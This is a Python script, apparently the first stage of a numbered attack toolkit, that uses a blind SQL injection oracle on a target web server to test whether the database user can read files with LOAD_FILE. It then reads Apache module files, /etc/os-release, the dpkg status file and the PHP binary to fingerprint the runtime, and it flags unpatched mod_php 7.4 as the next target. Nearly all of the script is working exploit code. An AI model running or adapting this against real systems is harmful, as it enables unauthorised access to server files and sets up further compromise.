#!/usr/bin/env python3
"""Stage 1+2 — confirm the SQLi oracle and fingerprint the runtime.

Reads only. Proves:
  * the time-based oracle works
  * the MySQL user can LOAD_FILE
  * the served PHP branch/version and SAPI

Usage:
  python 01_recon.py
"""
import sys

import common as c

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

FILES = {
    "/etc/apache2/mods-enabled/php7.4.load": "mod_php 7.4 module",
    "/etc/apache2/mods-enabled/php8.2.load": "mod_php 8.2 module",
    "/etc/apache2/mods-enabled/mpm_prefork.load": "prefork MPM",
    "/etc/apache2/mods-enabled/proxy_fcgi.load": "php-fpm via proxy",
    "/usr/bin/php7.4": "php 7.4 binary",
    "/etc/os-release": "os release",
    "/var/lib/dpkg/status": "dpkg status",
}


def main():
    c.out("[*] oracle sanity")
    true_r = c.Q("1=1")
    false_r = c.Q("1=2")
    c.out("    true=%s false=%s" % (true_r, false_r))
    if not (true_r and not false_r):
        c.out("[!] oracle not behaving — aborting")
        return 1

    c.out("\n[*] LOAD_FILE capability")
    if not c.file_exists("/etc/os-release"):
        c.out("[!] LOAD_FILE not available")
        return 1
    c.out("    LOAD_FILE works")

    c.out("\n[*] runtime fingerprint")
    for path, label in FILES.items():
        c.out("    %-46s %-22s %s" % (path, label, c.file_exists(path)))

    c.out("\n[*] version needles")
    if c.file_exists("/usr/bin/php7.4"):
        for needle in ("7.4.33", "7.4.34"):
            c.out("    php7.4 contains %-8s %s" % (needle, c.file_contains("/usr/bin/php7.4", needle)))
    c.out("    dpkg says 7.4.33           %s" % c.file_contains("/var/lib/dpkg/status", "Version: 7.4.33"))
    c.out("    ubuntu 22.04               %s" % c.file_contains("/etc/os-release", 'VERSION_ID="22.04"'))

    c.out("\n[*] interpretation")
    c.out("    php7.4.load present + no php8.2.load + no proxy_fcgi = mod_php 7.4 (highest risk SAPI)")
    c.out("    7.4 has no fixed release -> unpatched unless a vendor backport is installed")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
